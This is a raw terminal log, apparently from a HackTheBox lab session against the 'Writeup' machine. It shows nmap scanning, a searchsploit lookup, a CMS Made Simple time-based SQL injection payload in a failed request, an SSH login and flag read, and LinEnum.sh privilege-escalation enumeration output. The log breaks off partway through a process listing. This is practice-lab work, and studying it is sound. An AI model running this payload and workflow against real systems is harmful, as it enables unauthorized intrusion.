@@ -1,0 +1,1332 @@
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #ping 10.10.10.138                   
+PING 10.10.10.138 (10.10.10.138) 56(84) bytes of data.                               
+64 bytes from 10.10.10.138: icmp_seq=1 ttl=63 time=381 ms                            
+64 bytes from 10.10.10.138: icmp_seq=2 ttl=63 time=553 ms                            
+^C                                        
+--- 10.10.10.138 ping statistics ---      
+3 packets transmitted, 2 received, 33.3333% packet loss, time 2001ms                 
+rtt min/avg/max/mdev = 380.568/466.892/553.217/86.324 ms                             
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #mkdir nmap                          
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #nmap -sC -sV -oA nmap/writeup       
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 20:22 EST                      
+WARNING: No targets were specified, so 0 hosts scanned.                              
+Nmap done: 0 IP addresses (0 hosts up) scanned in 2.08 seconds                       
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #nmap -sC -sV -oA nmap/writeup 10.10.10.138                                     
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 20:22 EST                      
+Nmap scan report for 10.10.10.138         
+Host is up (1.6s latency).                
+Not shown: 998 filtered ports             
+PORT   STATE SERVICE VERSION              
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)                   
+| ssh-hostkey:                            
+|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)                       
+|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)                      
+|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)                    
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))                                  
+| http-robots.txt: 1 disallowed entry     
+|_/writeup/                               
+|_http-server-header: Apache/2.4.25 (Debian)                                         
+|_http-title: Nothing here yet.           
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                              
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                             
+Nmap done: 1 IP address (1 host up) scanned in 82.46 seconds                         
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #pip install termcolor               
+DEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won't be maintained after that date. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support                                    
+Requirement already satisfied: termcolor in /usr/lib/python2.7/dist-packages (1.1.0) 
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #searchsploit cms-made-simple        
+Exploits: No Result                       
+Shellcodes: No Result                     
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #searchsploit cms made simple                                                                                                                                         
+---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                                    |  Path                                  
+                                                                                                                                  | (/usr/share/exploitdb/)                
+---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                | exploits/php/remote/46627.rb           
+CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                           | exploits/php/webapps/26217.html        
+CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                           | exploits/php/webapps/26298.txt         
+CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                        | exploits/php/webapps/29272.txt         
+CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                            | exploits/php/webapps/29941.txt         
+CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                           | exploits/php/webapps/32668.txt         
+CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                 | exploits/php/webapps/43889.txt         
+CMS Made Simple 1.2 - Remote Code Execution                                                                                       | exploits/php/webapps/4442.txt          
+CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                              | exploits/php/webapps/4810.txt          
+CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                  | exploits/php/webapps/5600.php          
+CMS Made Simple 1.4.1 - Local File Inclusion                                                                                      | exploits/php/webapps/7285.txt          
+CMS Made Simple 1.6.2 - Local File Disclosure                                                                                     | exploits/php/webapps/9407.txt          
+CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                               | exploits/php/webapps/33643.txt         
+CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                  | exploits/php/webapps/11424.txt         
+CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                  | exploits/php/webapps/12009.html        
+CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                                     | exploits/php/webapps/34299.py          
+CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                           | exploits/php/webapps/34068.html        
+CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                  | exploits/php/webapps/41997.txt         
+CMS Made Simple 2.1.6 - Remote Code Execution                                                                                     | exploits/php/webapps/44192.txt         
+CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                     | exploits/php/webapps/44976.py          
+CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                     | exploits/php/webapps/45793.py          
+CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                                   | exploits/php/webapps/39760.txt         
+CMS Made Simple < 2.2.10 - SQL Injection                                                                                          | exploits/php/webapps/46635.py          
+CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                  | exploits/php/webapps/34300.py          
+CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                             | exploits/php/webapps/34298.py          
+CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                    | exploits/php/webapps/46546.py          
+---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result                     
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #searchsploit -m  exploits/php/webapps/46635.py                                 
+  Exploit: CMS Made Simple < 2.2.10 - SQL Injection                                  
+      URL: https://www.exploit-db.com/exploits/46635                                 
+     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py                        
+File Type: Python script, ASCII text executable, with CRLF line terminators          
+
+Copied to: /root/hackthebox/writeup/46635.py                                         
+
+
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #mv 46635.py cms-made-simple-sql.py  
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #ls                                  
+cms-made-simple-sql.py  nmap              
+┌─[root@parrot]─[~/hackthebox/writeup]    
+└──╼ #python cms-made-simple-sql.py -u http://10.10.10.138/writeup/                  
+
+
+[*] Try: 1                                
+Traceback (most recent call last):        
+  File "cms-made-simple-sql.py", line 177, in <module>                               
+    dump_salt()                           
+  File "cms-made-simple-sql.py", line 87, in dump_salt                               
+    r = session.get(url)                  
+  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 521, in get                                                                                     
+    return self.request('GET', url, **kwargs)                                        
+  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 508, in request                                                                                 
+    resp = self.send(prep, **send_kwargs) 
+  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 618, in send                                                                                    
+    r = adapter.send(request, **kwargs)   
+  File "/usr/local/lib/python2.7/dist-packages/requests/adapters.py", line 508, in send                                                                                    
+    raise ConnectionError(e, request=request)                                        
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='10.10.10.138', port=80): Max retries exceeded with url: /writeup//moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(1)+from+cms_siteprefs+where+sitepref_value+like+0x3125+and+sitepref_name+like+0x736974656d61736b)+--+ (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f4dee171610>: Failed to establish a new connection: [Errno 110] Connection timed out',))                                  
+┌─[✗]─[root@parrot]─[~/hackthebox/writeup]
+└──╼ #ssh jkr@10.10.10.138                
+The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.         
+ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.         
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes             
+Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.        
+jkr@10.10.10.138's password:              
+Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux                                         
+
+The programs included with the Devuan GNU/Linux system are free software;            
+the exact distribution terms for each program are described in the                   
+individual files in /usr/share/doc/*/copyright.                                      
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                    
+permitted by applicable law.              
+Last login: Sun Jan  5 18:57:39 2020 from 10.10.14.47                                
+jkr@writeup:~$ ls                         
+index.html  index.html.1  LinEnum.sh  user.txt                                       
+jkr@writeup:~$ cat user.txt               
+d4e493fd4068afc9eb1aa6a55319f978          
+jkr@writeup:~$ bash LinEnum.sh            
+
+#########################################################                            
+# Local Linux Enumeration & Privilege Escalation Script #                            
+#########################################################                            
+# www.rebootuser.com                      
+# version 0.981                           
+
+[-] Debug Info                            
+[+] Thorough tests = Enabled              
+
+
+Scan started at:                          
+Sun Jan  5 20:57:34 EST 2020              
+
+
+### SYSTEM ##############################################                            
+[-] Kernel information:                   
+Linux writeup 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux  
+
+
+[-] Kernel information (continued):       
+Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.144-3.1 (2019-02-19)                 
+
+
+[-] Specific release information:         
+PRETTY_NAME="Devuan GNU/Linux ascii"      
+NAME="Devuan GNU/Linux"                   
+ID=devuan                                 
+ID_LIKE=debian                            
+HOME_URL="https://www.devuan.org/"        
+SUPPORT_URL="https://devuan.org/os/community"                                        
+BUG_REPORT_URL="https://bugs.devuan.org/" 
+
+
+[-] Hostname:                             
+writeup                                   
+
+
+### USER/GROUP ##########################################                            
+[-] Current user/group info:              
+uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)                                            
+
+
+[-] Users that have previously logged onto the system:                               
+Username         Port     From             Latest                                    
+root             pts/0    10.10.14.47      Sun Jan  5 19:28:27 -0500 2020            
+jkr              pts/2    10.10.14.14      Sun Jan  5 20:56:27 -0500 2020            
+
+
+[-] Who else is logged on:                
+ 20:57:34 up  7:10,  3 users,  load average: 0.00, 0.00, 0.00                        
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                  
+root     pts/0    10.10.14.47      19:28    1:29m  0.00s  0.00s -bash                
+jkr      pts/1    10.10.14.47      17:51    1:58m  0.06s  0.01s nano run-parts       
+jkr      pts/2    10.10.14.14      20:56    5.00s  0.00s  0.00s bash LinEnum.sh      
+
+
+[-] Group memberships:                    
+uid=0(root) gid=0(root) groups=0(root)    
+uid=1(daemon) gid=1(daemon) groups=1(daemon)                                         
+uid=2(bin) gid=2(bin) groups=2(bin)       
+uid=3(sys) gid=3(sys) groups=3(sys)       
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)                                 
+uid=5(games) gid=60(games) groups=60(games)                                          
+uid=6(man) gid=12(man) groups=12(man)     
+uid=7(lp) gid=7(lp) groups=7(lp)          
+uid=8(mail) gid=8(mail) groups=8(mail)    
+uid=9(news) gid=9(news) groups=9(news)    
+uid=10(uucp) gid=10(uucp) groups=10(uucp) 
+uid=13(proxy) gid=13(proxy) groups=13(proxy)                                         
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                                
+uid=34(backup) gid=34(backup) groups=34(backup)                                      
+uid=38(list) gid=38(list) groups=38(list) 
+uid=39(irc) gid=39(irc) groups=39(irc)    
+uid=41(gnats) gid=41(gnats) groups=41(gnats)                                         
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)                           
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)                               
+uid=101(messagebus) gid=104(messagebus) groups=104(messagebus)                       
+uid=102(sshd) gid=65534(nogroup) groups=65534(nogroup)                               
+uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)                                            
+uid=103(mysql) gid=106(mysql) groups=106(mysql)                                      
+
+
+[-] Contents of /etc/passwd:              
+root:x:0:0:root:/root:/bin/bash           
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                      
+bin:x:2:2:bin:/bin:/usr/sbin/nologin      
+sys:x:3:3:sys:/dev:/usr/sbin/nologin      
+sync:x:4:65534:sync:/bin:/bin/sync        
+games:x:5:60:games:/usr/games:/usr/sbin/nologin                                      
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                      
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                         
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                          
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                    
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                  
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                           
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                 
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                 
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                        
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                     
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin    
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                           
+_apt:x:100:65534::/nonexistent:/bin/false 
+messagebus:x:101:104::/var/run/dbus:/bin/false                                       
+sshd:x:102:65534::/run/sshd:/usr/sbin/nologin                                        
+jkr:x:1000:1000:jkr,,,:/home/jkr:/bin/bash                                           
+mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false                              
+
+
+[-] Super user account(s):                
+root                                      
+
+
+[-] Are permissions on /home directories lax:                                        
+total 12K                                 
+drwxr-xr-x  3 root root 4.0K Apr 19  2019 .                                          
+drwxr-xr-x 23 root root 4.0K Jan  5 18:39 ..                                         
+drwxr-xr-x  3 jkr  jkr  4.0K Jan  5 17:34 jkr                                        
+
+
+[-] Files owned by our user:              
+-rw-r--r-- 1 jkr jkr 675 Apr 19  2019 /home/jkr/.profile                             
+-rw-r--r-- 1 jkr jkr 218 Jan  5 16:47 /home/jkr/index.html.1                         
+-rw-r--r-- 1 jkr jkr 220 Apr 19  2019 /home/jkr/.bash_logout                         
+-rwx------ 1 jkr jkr 46487 Jan  5 09:30 /home/jkr/LinEnum.sh                         
+-rw-r--r-- 1 jkr jkr 218 Jan  5 16:47 /home/jkr/index.html                           
+-rw-r--r-- 1 jkr jkr 3526 Apr 19  2019 /home/jkr/.bashrc                             
+-rwxr--r-- 1 jkr jkr 1156536 Jan  5 10:09 /tmp/pspy64s                               
+
+
+[-] Hidden files:                         
+-rw-r--r-- 1 root root 179 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htaccess                                  
+-rw-r--r-- 1 root root 62 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd                                   
+-rw-r--r-- 1 root root 231 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htaccess                                       
+-rw-r--r-- 1 root root 117 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd                                       
+-rw-r--r-- 1 root root 136 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htaccess                                 
+-rw-r--r-- 1 root root 47 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd                                  
+-rw-r--r-- 1 root root 129 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htaccess                                        
+-rw-r--r-- 1 root root 47 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd                                         
+-rw-r--r-- 1 root root 195 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htaccess                                       
+-rw-r--r-- 1 root root 62 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd                                        
+-rw-r--r-- 1 root root 159 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htaccess                                            
+-rw-r--r-- 1 root root 62 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd                                             
+-rw-r--r-- 1 root root 14 Dec  9  2016 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/noentry/.htaccess                                            
+-rw-r--r-- 1 root root 0 Jan  5 13:47 /run/shm/.tmpfs                                
+-rw-r--r-- 1 root root 0 Jan  5 13:47 /run/network/.ifstate.lock                     
+-rw-r--r-- 1 root root 628 Aug 23 05:16 /etc/init.d/.depend.start                    
+-rw-r--r-- 1 root root 1206 Aug 23 05:16 /etc/init.d/.depend.boot                    
+-rw-r--r-- 1 root root 790 Aug 23 05:16 /etc/init.d/.depend.stop                     
+-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.d/.placeholder                     
+-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.monthly/.placeholder               
+-rw------- 1 root root 0 Apr 19  2019 /etc/.pwd.lock                                 
+-rw-r--r-- 1 root root 675 May 15  2017 /etc/skel/.profile                           
+-rw-r--r-- 1 root root 220 May 15  2017 /etc/skel/.bash_logout                       
+-rw-r--r-- 1 root root 3526 May 15  2017 /etc/skel/.bashrc                           
+-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.weekly/.placeholder                
+-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.hourly/.placeholder                
+-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.daily/.placeholder                 
+-rw-r--r-- 1 jkr jkr 675 Apr 19  2019 /home/jkr/.profile                             
+-rw-r--r-- 1 jkr jkr 220 Apr 19  2019 /home/jkr/.bash_logout                         
+-rw-r--r-- 1 jkr jkr 3526 Apr 19  2019 /home/jkr/.bashrc                             
+
+
+[-] World-readable files within /home:    
+-rw-r--r-- 1 jkr jkr 675 Apr 19  2019 /home/jkr/.profile                             
+-rw-r--r-- 1 jkr jkr 218 Jan  5 16:47 /home/jkr/index.html.1                         
+-rw-r--r-- 1 jkr jkr 220 Apr 19  2019 /home/jkr/.bash_logout                         
+-r--r--r-- 1 root root 33 Apr 19  2019 /home/jkr/user.txt                            
+-rw-r--r-- 1 jkr jkr 218 Jan  5 16:47 /home/jkr/index.html                           
+-rw-r--r-- 1 jkr jkr 3526 Apr 19  2019 /home/jkr/.bashrc                             
+
+
+[-] Home directory contents:              
+total 84K                                 
+drwxr-xr-x 3 jkr  jkr  4.0K Jan  5 17:34 .                                           
+drwxr-xr-x 3 root root 4.0K Apr 19  2019 ..                                          
+lrwxrwxrwx 1 root root    9 Apr 19  2019 .bash_history -> /dev/null                  
+-rw-r--r-- 1 jkr  jkr   220 Apr 19  2019 .bash_logout                                
+-rw-r--r-- 1 jkr  jkr  3.5K Apr 19  2019 .bashrc                                     
+-rw-r--r-- 1 jkr  jkr   218 Jan  5 16:47 index.html                                  
+-rw-r--r-- 1 jkr  jkr   218 Jan  5 16:47 index.html.1                                
+-rwx------ 1 jkr  jkr   46K Jan  5 09:30 LinEnum.sh                                  
+drwxr-xr-x 2 jkr  jkr  4.0K Jan  5 17:34 .nano                                       
+-rw-r--r-- 1 jkr  jkr   675 Apr 19  2019 .profile                                    
+-r--r--r-- 1 root root   33 Apr 19  2019 user.txt                                    
+
+
+### ENVIRONMENTAL #######################################                            
+[-] Environment information:              
+SSH_CONNECTION=10.10.14.14 34200 10.10.10.138 22                                     
+LANG=en_US.UTF-8                          
+USER=jkr                                  
+PWD=/home/jkr                             
+HOME=/home/jkr                            
+SSH_CLIENT=10.10.14.14 34200 22           
+SSH_TTY=/dev/pts/2                        
+MAIL=/var/mail/jkr                        
+SHELL=/bin/bash                           
+TERM=screen-256color                      
+SHLVL=2                                   
+LOGNAME=jkr                               
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                        
+_=/usr/bin/env                            
+
+
+[-] Path information:                     
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                             
+drwxr-xr-x 2 root root   4096 Apr 19  2019 /bin                                      
+drwxr-xr-x 2 root root  20480 Aug 23 05:16 /usr/bin                                  
+drwxr-xr-x 2 root root   4096 Jun  3  2018 /usr/games                                
+drwx-wsr-x 2 root staff 20480 Jan  5 19:00 /usr/local/bin                            
+drwxrwsr-x 2 root staff  4096 Apr 19  2019 /usr/local/games                          
+
+
+[-] Available shells:                     
+# /etc/shells: valid login shells         
+/bin/sh                                   
+/bin/dash                                 
+/bin/bash                                 
+/bin/rbash                                
+
+
+[-] Current umask value:                  
+0022                                      
+u=rwx,g=rx,o=rx                           
+
+
+[-] umask value as specified in /etc/login.defs:                                     
+UMASK           022                       
+
+
+[-] Password and storage information:     
+PASS_MAX_DAYS   99999                     
+PASS_MIN_DAYS   0                         
+PASS_WARN_AGE   7                         
+ENCRYPT_METHOD SHA512                     
+
+
+### JOBS/TASKS ##########################################                            
+[-] Cron jobs:                            
+-rw-r--r-- 1 root root  742 Oct  7  2017 /etc/crontab                                
+
+/etc/cron.d:                              
+total 16                                  
+drwxr-xr-x  2 root root 4096 Apr 19  2019 .                                          
+drwxr-xr-x 81 root root 4096 Aug 23 05:16 ..                                         
+-rw-r--r--  1 root root  702 Apr 19  2019 php                                        
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder                               
+
+/etc/cron.daily:                          
+total 36                                  
+drwxr-xr-x  2 root root 4096 Apr 19  2019 .                                          
+drwxr-xr-x 81 root root 4096 Aug 23 05:16 ..                                         
+-rwxr-xr-x  1 root root  539 Nov  3  2018 apache2                                    
+-rwxr-xr-x  1 root root 1474 Sep 13  2017 apt-compat                                 
+-rwxr-xr-x  1 root root  355 Oct 25  2016 bsdmainutils                               
+-rwxr-xr-x  1 root root 1597 Feb 22  2017 dpkg                                       
+-rwxr-xr-x  1 root root   89 May  5  2015 logrotate                                  
+-rwxr-xr-x  1 root root  249 May 17  2017 passwd                                     
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder                               
+
+/etc/cron.hourly:                         
+total 12                                  
+drwxr-xr-x  2 root root 4096 Apr 19  2019 .                                          
+drwxr-xr-x 81 root root 4096 Aug 23 05:16 ..                                         
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder                               
+
+/etc/cron.monthly:                        
+total 12                                  
+drwxr-xr-x  2 root root 4096 Apr 19  2019 .                                          
+drwxr-xr-x 81 root root 4096 Aug 23 05:16 ..                                         
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder                               
+
+/etc/cron.weekly:                         
+total 12                                  
+drwxr-xr-x  2 root root 4096 Apr 19  2019 .                                          
+drwxr-xr-x 81 root root 4096 Aug 23 05:16 ..                                         
+-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder                               
+
+
+[-] Crontab contents:                     
+# /etc/crontab: system-wide crontab       
+# Unlike any other crontab you don't have to run the `crontab'                       
+# command to install the new version when you edit this file                         
+# and files in /etc/cron.d. These files also have username fields,                   
+# that none of the other crontabs do.     
+
+SHELL=/bin/sh                             
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                    
+
+# m h dom mon dow user  command           
+17 *    * * *   root    cd / && /bin/run-parts --report /etc/cron.hourly             
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && /bin/run-parts --report /etc/cron.daily )                                                                   
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && /bin/run-parts --report /etc/cron.weekly )                                                                  
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && /bin/run-parts --report /etc/cron.monthly )                                                                 
+#                                         
+
+
+### NETWORKING  ##########################################                           
+[-] Network and IP info:                  
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                           
+        inet 10.10.10.138  netmask 255.255.255.0  broadcast 10.10.10.255             
+        inet6 fe80::250:56ff:feb9:837a  prefixlen 64  scopeid 0x20<link>             
+        ether 00:50:56:b9:83:7a  txqueuelen 1000  (Ethernet)                         
+        RX packets 212979  bytes 21949071 (20.9 MiB)                                 
+        RX errors 0  dropped 11  overruns 0  frame 0                                 
+        TX packets 25947  bytes 12112743 (11.5 MiB)                                  
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                   
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                         
+        inet 127.0.0.1  netmask 255.0.0.0 
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>                                 
+        loop  txqueuelen 1  (Local Loopback)                                         
+        RX packets 151  bytes 16708 (16.3 KiB)                                       
+        RX errors 0  dropped 0  overruns 0  frame 0                                  
+        TX packets 151  bytes 16708 (16.3 KiB)                                       
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                   
+
+
+[-] ARP history:                          
+10.10.10.2 dev eth0 lladdr 00:50:56:b9:99:17 REACHABLE                               
+
+
+[-] Nameserver(s):                        
+nameserver 10.211.55.1                    
+
+
+[-] Default route:                        
+default via 10.10.10.2 dev eth0 onlink    
+
+
+[-] Listening TCP:                        
+Active Internet connections (only servers)                                           
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                                                                           
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                          
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                          
+tcp6       0      0 :::80                   :::*                    LISTEN      -                                                                                          
+tcp6       0      0 :::22                   :::*                    LISTEN      -                                                                                          
+
+
+[-] Listening UDP:                        
+Active Internet connections (only servers)                                           
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                                                                           
+
+
+### SERVICES #############################################                           
+[-] Running processes:                    
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND             
+root         1  0.0  0.1  15796  1880 ?        Ss   13:47   0:00 init [2]            
+root         2  0.0  0.0      0     0 ?        S    13:47   0:00 [kthreadd]          
+root         3  0.0  0.0      0     0 ?        S    13:47   0:00 [ksoftirqd/0]       
+root         5  0.0  0.0      0     0 ?        S<   13:47   0:00 [kworker/0:0H]      
+root         7  0.0  0.0      0     0 ?        S    13:47   0:01 [rcu_sched]         
+root         8  0.0  0.0      0     0 ?        S    13:47   0:00 [rcu_bh]            
+root         9  0.0  0.0      0     0 ?        S    13:47   0:00 [migration/0]       
+root        10  0.0  0.0      0     0 ?        S<   13:47   0:00 [lru-add-drain]     
+root        11  0.0  0.0      0     0 ?        S    13:47   0:00 [watchdog/0]        
+root        12  0.0  0.0      0     0 ?        S    13:47   0:00 [cpuhp/0]           
+root        13  0.0  0.0      0     0 ?        S    13:47   0:00 [kdevtmpfs]         
+root        14  0.0  0.0      0     0 ?        S<   13:47   0:00 [netns]             
+root        15  0.0  0.0      0     0 ?        S    13:47   0:00 [khungtaskd]        
+root        16  0.0  0.0      0     0 ?        S    13:47   0:00 [oom_reaper]        
+root        17  0.0  0.0      0     0 ?        S<   13:47   0:00 [writeback]         
+root        18  0.0  0.0      0     0 ?        S    13:47   0:00 [kcompactd0]        
+root        19  0.0  0.0      0     0 ?        SN   13:47   0:00 [ksmd]              
+root        21  0.0  0.0      0     0 ?        SN   13:47   0:00 [khugepaged]        
+root        22  0.0  0.0      0     0 ?        S<   13:47   0:00 [crypto]            
+root        23  0.0  0.0      0     0 ?        S<   13:47   0:00 [kintegrityd]       
+root        24  0.0  0.0      0     0 ?        S<   13:47   0:00 [bioset]            
+root        25  0.0  0.0      0     0 ?        S<   13:47   0:00 [kblockd]           
+root        26  0.0  0.0      0     0 ?        S<   13:47   0:00 [devfreq_wq]        
+root        27  0.0  0.0      0     0 ?        S<   13:47   0:00 [watchdogd]         
+root        28  0.0  0.0      0     0 ?        S    13:47   0:00 [kswapd0]           
+root        29  0.0  0.0      0     0 ?        S<   13:47   0:00 [vmstat]            
+root        41  0.0  0.0      0     0 ?        S<   13:47   0:00 [kthrotld]          
+root        42  0.0  0.0      0     0 ?        S<   13:47   0:00 [ipv6_addrconf]     
+root        43  0.0  0.0      0     0 ?        S    13:47   0:06 [kworker/0:2]       
+root        76  0.0  0.0      0     0 ?        S<   13:47   0:00 [mpt_poll_0]        
+root        77  0.0  0.0      0     0 ?        S<   13:47   0:00 [ata_sff]           
+root        78  0.0  0.0      0     0 ?        S<   13:47   0:00 [mpt/0]             
+root        85  0.0  0.0      0     0 ?        S    13:47   0:00 [kworker/u2:1]      
+root       105  0.0  0.0      0     0 ?        S    13:47   0:00 [scsi_eh_0]         
+root       106  0.0  0.0      0     0 ?        S<   13:47   0:00 [scsi_tmf_0]        
+root       107  0.0  0.0      0     0 ?        S<   13:47   0:00 [bioset]            
+root       108  0.0  0.0      0     0 ?        S    13:47   0:00 [scsi_eh_1]         
+root       109  0.0  0.0      0     0 ?        S<   13:47   0:00 [scsi_tmf_1]        
